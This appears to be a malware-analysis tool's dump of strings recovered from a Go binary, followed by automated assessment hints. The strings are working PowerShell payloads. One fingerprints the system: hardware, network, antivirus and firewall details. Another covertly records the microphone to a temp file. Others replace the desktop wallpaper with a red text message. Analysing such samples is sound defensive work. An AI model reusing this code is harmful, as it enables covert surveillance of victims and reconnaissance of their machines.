string_args: $os=Get-WmiObject Win32_OperatingSystem;$cs=Get-WmiObject Win32_ComputerSystem;$bios=Get-WmiObject Win32_BIOS;$cpu=Get-WmiObject Win32_Processor;$ram=[math]::Round($cs.TotalPhysicalMemory/1GB,1);$ramFree=[math]::Round($os.FreePhysicalMemory/1MB,1);$gpu=Get-WmiObject Win32_VideoController|Select-Object -First 1;$localIP=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1'}|Select-Object -First 1 -ExpandProperty IPAddress);$mac=(Get-NetAdapter|Where-Object{$_.Status -eq 'Up'}|Select-Object -First 1 -ExpandProperty MacAddress);$gateway=(Get-NetRoute -DestinationPrefix '0.0.0.0/0'|Select-Object -First 1 -ExpandProperty NextHop);$dns=(Get-DnsClientServerAddress|Where-Object{$_.ServerAddresses}|Select-Object -First 1 -ExpandProperty ServerAddresses);$wifi=(netsh wlan show interfaces)-match 'SSID'|Select-Object -First 1;$wifiSignal=(netsh wlan show interfaces)-match 'Signal'|Select-Object -First 1;$av=(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct|Select-Object -First 1 -ExpandProperty displayName);$fw=(Get-NetFirewallProfile|Where-Object{$_.Enabled}|Select-Object -First 1 -ExpandProperty Name);$timezone=(Get-TimeZone).DisplayName;$locale=(Get-Culture).Name;$swCount=(Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Measure-Object).Count;$procCount=(Get-Process|Measure-Object).Count;$battery=(Get-WmiObject Win32_Battery).EstimatedChargeRemaining;if(-not $battery){$battery="N/A"};$result=[PSCustomObject]@{OS=$os.Caption;OSVersion=$os.Version;OSBuild=$os.BuildNumber;Hostname=$env:COMPUTERNAME;Username=$env:USERNAME;Manufacturer=$cs.Manufacturer;Model=$cs.Model;Serial=$bios.SerialNumber;BIOSVersion=$bios.SMBIOSBIOSVersion;BIOSDate=$bios.ReleaseDate;CPU=$cpu.Name;CPUCores=$cpu.NumberOfCores;CPUThreads=$cpu.NumberOfLogicalProcessors;CPUClock=$cpu.MaxClockSpeed;RAMTotal=$ram;RAMFree=$ramFree;GPU=$gpu.Name;GPUVRAM=[math]::Round($gpu.AdapterRAM/1GB,1);LocalIP=$localIP;MAC=$mac;Gateway=$gateway;DNS=$dns;WiFi=$wifi;WiFiSignal=$wifiSignal;Antivirus=$av;Firewall=$fw;Timezone=$timezone;Locale=$locale;SoftwareCount=$swCount;ProcessCount=$procCount;Battery="$battery"};$result|ConvertTo-Json -Compress

string_args:
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AudioRecorder {
    [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
    public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
}
"@
$wav = "$env:TEMP\mic_record.wav"
[AudioRecorder]::mciSendString("open new Type waveaudio Alias recsound", $null, 0, 0) | Out-Null
[AudioRecorder]::mciSendString("set recsound time format ms", $null, 0, 0) | Out-Null
[AudioRecorder]::mciSendString("record recsound", $null, 0, 0) | Out-Null
Start-Sleep -Seconds 15
[AudioRecorder]::mciSendString("stop recsound", $null, 0, 0) | Out-Null
[AudioRecorder]::mciSendString("save recsound $wav", $null, 0, 0) | Out-Null
[AudioRecorder]::mciSendString("close recsound", $null, 0, 0) | Out-Null
Write-Output $wav

using System;

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]

}
"@
$wav = "$env:TEMP\mic_record.wav"

[AudioRecorder]::mciSendString("set recsound time format ms", $null, 0, 0) | Out-Null

Write-Output $wav")

main.setWallpaperFromURL.display: fmt.Sprintf("$code = '[DllImport(\"user32.dll\",SetLastError=true)]public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);';Add-Type -MemberDefinition $code -Name NativeMethods -Namespace Win32;[Win32.NativeMethods]::SystemParametersInfo(20, 0, \"%s\", 3)")

string_args: Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object System.Drawing.Bitmap(1920, 1080); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.Clear([System.Drawing.Color]::Black); $font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold); $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red); $text = "%s"; $lines = $text -split "\n"; $lineHeight = $font.GetHeight($graphics); $totalHeight = $lines.Count * $lineHeight; $startY = (1080 - $totalHeight) / 2; for ($i = 0; $i -lt $lines.Count; $i++) { $line = $lines[$i]; $lineSize = $graphics.MeasureString($line, $font); $x = (1920 - $lineSize.Width) / 2; $y = $startY + ($i * $lineHeight); $graphics.DrawString($line, $font, $brush, $x, $y) }; $bitmap.Save("%s", [System.Drawing.Imaging.ImageFormat]::Bmp); $graphics.Dispose(); $bitmap.Dispose()

arg_registers.RAX/RBX: Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object System.Drawing.Bitmap(1920, 1080); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.Clear([System.Drawing.Color]::Black); $font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold); $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red); $text = "%s"; $lines = $text -split "\n"; $lineHeight = $font.GetHeight($graphics); $totalHeight = $lines.Count * $lineHeight; $startY = (1080 - $totalHeight) / 2; for ($i = 0; $i -lt $lines.Count; $i++) { $line = $lines[$i]; $lineSize = $graphics.MeasureString($line, $font); $x = (1920 - $lineSize.Width) / 2; $y = $startY + ($i * $lineHeight); $graphics.DrawString($line, $font, $brush, $x, $y) }; $bitmap.Save("%s", [System.Drawing.Imaging.ImageFormat]::Bmp); $graphics.Dispose(); $bitmap.Dispose()

main.changeWallpaperToMessage.display: fmt.Sprintf("Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $bitmap = New-Object System.Drawing.Bitmap(1920, 1080); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.Clear([System.Drawing.Color]::Black); $font = New-Object System.Drawing.Font(\"Arial\", 48, [System.Drawing.FontStyle]::Bold); $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red); $text = \"%s\"; $lines = $text -split \"\\n\"; $lineHeight = $font.GetHeight($graphics); $totalHeight = $lines.Count * $lineHeight; $startY = (1080 - $totalHeight) / 2; for ($i = 0; $i -lt $lines.Count; $i++) { $line = $lines[$i]; $lineSize = $graphics.MeasureString($line, $font); $x = (1920 - $lineSize.Width) / 2; $y = $startY + ($i * $lineHeight); $graphics.DrawString($line, $font, $brush, $x, $y) }; $bitmap.Save(\"%s\", [System.Drawing.Imaging.ImageFormat]::Bmp); $graphics.Dispose(); $bitmap.Dispose()")

assessment_hints: Reachable code references suspicious high-entropy or magic-containing data blobs.
Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
